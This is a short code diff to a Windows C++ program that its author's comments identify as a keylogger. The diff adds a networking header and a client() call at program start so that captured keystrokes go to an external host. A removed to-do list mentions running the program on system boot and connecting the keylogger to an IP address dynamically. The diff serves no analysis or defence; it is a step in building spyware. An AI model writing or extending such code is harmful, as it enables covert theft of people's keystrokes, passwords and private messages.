@@ -12,6 +12,7 @@
 #include "core/mappings.h"
 #include "core/constants.h"
 #include "core/find_shift_keys.h"
+#include "networking/ks2server.h"
 
 #include <windows.h>
 #include <iostream>
@@ -37,6 +38,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     PSTR lpCmdLine, int nCmdShow)
 {
     //FreeConsole();
+    client();
     Maps vkMaps;
     vkMaps.initializeMaps();
     while (1)
@@ -73,9 +75,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 }
 
 /*
+    Notes
+    
+
     To-Do list
 
-    ~ write client network code to send to an external host. 
-    ~ write code to autonomously create a task to run this program on system boot.
-    ~ think about how i can seemlessly get my keylogger to connect to an ip address dynamically.
+    ~ fix ks2server.cpp, it will not compile because I have incorrectly written the code.
 */
